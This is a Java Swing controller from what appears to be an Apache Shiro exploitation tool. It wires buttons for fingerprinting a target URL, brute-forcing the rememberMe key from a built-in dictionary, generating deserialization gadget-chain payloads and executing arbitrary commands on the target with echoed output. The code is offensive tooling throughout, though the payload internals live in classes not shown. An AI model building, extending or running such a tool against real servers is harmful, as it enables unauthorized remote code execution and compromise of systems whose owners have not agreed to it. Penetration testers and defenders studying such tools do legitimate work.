package ui;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.swing.SwingUtilities;

import util.Platform;

/**
 * Shiro 漏洞利用页的行为：指纹检测、密钥爆破、载荷生成、命令回显。
 *
 * <p>四个动作各自有独立回显页签（{@code outputTabs}），因此每个动作只写自己的
 * 文本域；页签在视图类里只建一次，反复进出页面不会累积页签。
 *
 * <p>所有网络动作都在后台线程执行，回填统一走 {@code SwingUtilities.invokeLater}：
 * 爆破一条字典最坏要跑几十秒，放 EDT 上会把整个界面卡死。
 */
public final class ShiroController implements ActionListener {

    private final ShiroPage.Widgets widgets;
    private final ProbePage.Widgets probe;

    /** 爆破取消标志：与界面上的「停止」按钮共享。 */
    private final AtomicBoolean cancel = new AtomicBoolean();

    /** 已识别出的密钥与加密方式，供「生成 Payload」「执行命令」直接沿用。 */
    private volatile String crackedKey = "";
    private volatile boolean crackedGcm;

    public ShiroController(ShiroPage.Widgets widgets, ProbePage.Widgets probe) {
        this.widgets = widgets;
        this.probe = probe;
        wire();
    }

    private void wire() {
        widgets.detect.addActionListener(this);
        widgets.crack.addActionListener(this);
        widgets.stop.addActionListener(this);
        widgets.build.addActionListener(this);
        widgets.run.addActionListener(this);
    }

    @Override
    public void actionPerformed(ActionEvent event) {
        Object source = event.getSource();
        if (source == widgets.detect) startDetect();
        else if (source == widgets.crack) startCrack();
        else if (source == widgets.stop) cancel.set(true);
        else if (source == widgets.build) buildPayload();
        else if (source == widgets.run) runCommand();
    }

    /** 引擎调用参数：URL / 方法 / Cookie 名 / 附加头 / 请求体 / 超时。 */
    public shiro.ShiroEngine.Options options() {
        shiro.ShiroEngine.Options options = new shiro.ShiroEngine.Options();
        options.url = widgets.url.getText().trim();
        options.method = String.valueOf(widgets.requestMethod.getSelectedItem());
        options.cookieName = Platform.valueOr(widgets.cookieName.getText().trim(),
                shiro.ShiroEngine.REMEMBER_ME);
        options.extraHeaders = widgets.headers.getText();
        options.body = widgets.body.getText();
        options.timeoutSeconds = Integer.parseInt(Platform.valueOr(probe.timeout.getText(), "8"));
        return options;
    }

    /** 往指定功能的回显框追加内容，并把它滚到底部。 */
    private static void append(javax.swing.JTextArea target, String text) {
        target.append(text);
        if (!text.endsWith(System.lineSeparator())) target.append(System.lineSeparator());
        target.setCaretPosition(target.getDocument().getLength());
    }

    /** 切换输出区页签（按标题查找，找不到则保持当前页签）。 */
    public void showTab(String title) {
        for (int index = 0; index < widgets.outputTabs.getTabCount(); index++) {
            if (title.equals(widgets.outputTabs.getTitleAt(index))) {
                widgets.outputTabs.setSelectedIndex(index);
                return;
            }
        }
    }

    public void startDetect() {
        final shiro.ShiroEngine.Options options = options();
        if (options.url.isEmpty()) {
            widgets.status.setText("目标 URL 不能为空");
            return;
        }
        widgets.status.setText("正在检测 Shiro 指纹…");
        widgets.detectOutput.setText("");
        showTab("指纹检测");
        append(widgets.detectOutput, "===== Shiro 指纹检测 =====");
        append(widgets.detectOutput, "目标：" + options.url + "（" + options.method + "）");
        new Thread(() -> {
            shiro.ShiroEngine.FingerprintResult result = shiro.ShiroEngine.detect(options);
            SwingUtilities.invokeLater(() -> {
                for (String line : result.evidence) append(widgets.detectOutput, line);
                append(widgets.detectOutput, result.message);
                if (result.shiroDetected) {
                    append(widgets.detectOutput, "下一步：可点击「密钥爆破」用内置 "
                            + shiro.ShiroEngine.builtinKeys().size() + " 条字典识别密钥。");
                    widgets.status.setText("确认存在 Shiro，等待密钥识别");
                } else {
                    widgets.status.setText("未确认 Shiro");
                }
            });
        }, "shiro-detect").start();
    }

    public void startCrack() {
        final shiro.ShiroEngine.Options options = options();
        if (options.url.isEmpty()) {
            widgets.status.setText("目标 URL 不能为空");
            return;
        }
        final List<String> keys = shiro.ShiroEngine.builtinKeys();
        if (keys.isEmpty()) {
            widgets.status.setText("内置密钥字典为空，请确认资源文件已打包");
            return;
        }
        final boolean gcm = widgets.gcm.isSelected();
        cancel.set(false);
        widgets.progress.setVisible(true);
        widgets.progress.setMaximum(keys.size());
        widgets.progress.setValue(0);
        widgets.progress.setString("0 / " + keys.size());
        showTab("密钥爆破");
        append(widgets.crackOutput, "===== Shiro 密钥爆破 =====");
        append(widgets.crackOutput, "字典 " + keys.size() + " 条，加密方式 "
                + shiro.ShiroEngine.describeMode(gcm));
        widgets.status.setText("正在爆破密钥…");
        new Thread(() -> {
            shiro.ShiroEngine.FingerprintResult fingerprint = shiro.ShiroEngine.detect(options);
            if (!fingerprint.shiroDetected) {
                SwingUtilities.invokeLater(() -> {
                    append(widgets.crackOutput, "未确认 Shiro，已终止爆破：" + fingerprint.message);
                    widgets.status.setText("未确认 Shiro，爆破终止");
                    widgets.progress.setVisible(false);
                });
                return;
            }
            final int baseline = fingerprint.probeDeleteMe;
            shiro.ShiroEngine.KeyResult result = shiro.ShiroEngine.crack(options, keys, gcm, baseline, 8,
                    new shiro.ShiroEngine.CrackListener() {
                        @Override public void onProgress(int tested, int total, String currentKey) {
                            SwingUtilities.invokeLater(() -> {
                                widgets.progress.setValue(tested);
                                widgets.progress.setString(tested + " / " + total);
                            });
                        }

                        @Override public void onFound(String key, boolean foundGcm, int tested) {
                            SwingUtilities.invokeLater(() -> append(widgets.crackOutput, "命中密钥：" + key
                                    + "（第 " + tested + " 条，" + shiro.ShiroEngine.describeMode(foundGcm) + "）"));
                        }
                    }, cancel);
            SwingUtilities.invokeLater(() -> {
                widgets.progress.setVisible(false);
                append(widgets.crackOutput, result.message);
                if (result.matched) {
                    crackedKey = result.key;
                    crackedGcm = result.gcm;
                    widgets.key.setText(result.key);
                    widgets.gcm.setSelected(result.gcm);
                    widgets.status.setText("已识别密钥：" + result.key);
                } else {
                    widgets.status.setText("未识别到密钥（已试 " + result.tested + " 条）");
                }
            });
        }, "shiro-crack").start();
    }

    public void buildPayload() {
        final shiro.ShiroExploit.ChainKind kind =
                (shiro.ShiroExploit.ChainKind) widgets.chain.getSelectedItem();
        final String command = widgets.command.getText().trim();
        final String key = widgets.key.getText().trim();
        final boolean gcm = widgets.gcm.isSelected();
        if (key.isEmpty()) {
            widgets.status.setText("请先填写 Shiro 密钥");
            return;
        }
        showTab("生成 Payload");
        append(widgets.buildOutput, "===== 生成 Payload =====");
        new Thread(() -> {
            shiro.ShiroExploit exploit = new shiro.ShiroExploit(options(), key, gcm,
                    widgets.echoHeader.getText().trim());
            if (!command.isEmpty()) {
                shiro.ChainsEngine.Generated generated = exploit.buildCommandPayload(kind, command);
                SwingUtilities.invokeLater(() -> {
                    append(widgets.buildOutput, "链条：" + kind.display() + " → exec（" + command + "）");
                    append(widgets.buildOutput, generated.success
                            ? generated.message + "\n" + generated.payload : generated.message);
                    widgets.status.setText(generated.success ? "Payload 生成完成" : "Payload 生成失败");
                });
                return;
            }
            shiro.ChainsEngine.Generated generated = exploit.buildEchoPayload(kind);
            SwingUtilities.invokeLater(() -> {
                append(widgets.buildOutput, "链条：" + kind.display());
                append(widgets.buildOutput, generated.success
                        ? generated.message + "\n" + generated.payload : generated.message);
                widgets.status.setText(generated.success ? "Payload 生成完成" : "Payload 生成失败");
            });
        }, "shiro-build").start();
    }

    public void runCommand() {
        final shiro.ShiroExploit.ChainKind kind =
                (shiro.ShiroExploit.ChainKind) widgets.chain.getSelectedItem();
        final String command = widgets.command.getText().trim();
        final String key = widgets.key.getText().trim();
        final boolean gcm = widgets.gcm.isSelected();
        final shiro.ShiroEngine.Options options = options();
        if (options.url.isEmpty() || command.isEmpty() || key.isEmpty()) {
            widgets.status.setText("目标 URL、密钥、命令都不能为空");
            return;
        }
        showTab("执行命令");
        append(widgets.runOutput, "===== 执行命令 =====");
        widgets.status.setText("正在执行命令…");
        new Thread(() -> {
            shiro.ShiroExploit exploit = new shiro.ShiroExploit(options, key, gcm,
                    widgets.echoHeader.getText().trim());
            try {
                shiro.ShiroExploit.Result result = exploit.execute(kind, command);
                SwingUtilities.invokeLater(() -> {
                    for (String line : result.steps) append(widgets.runOutput, line);
                    widgets.status.setText(result.message);
                });
            } catch (Exception error) {
                SwingUtilities.invokeLater(() -> {
                    append(widgets.runOutput, "执行失败：" + error.getMessage());
                    widgets.status.setText("执行失败");
                });
            }
        }, "shiro-run").start();
    }

    /** 已识别密钥与加密方式：供界面层在切换页面后复用，避免重复爆破。 */
    public String crackedKey() {
        return crackedKey;
    }

    public boolean crackedGcm() {
        return crackedGcm;
    }
}
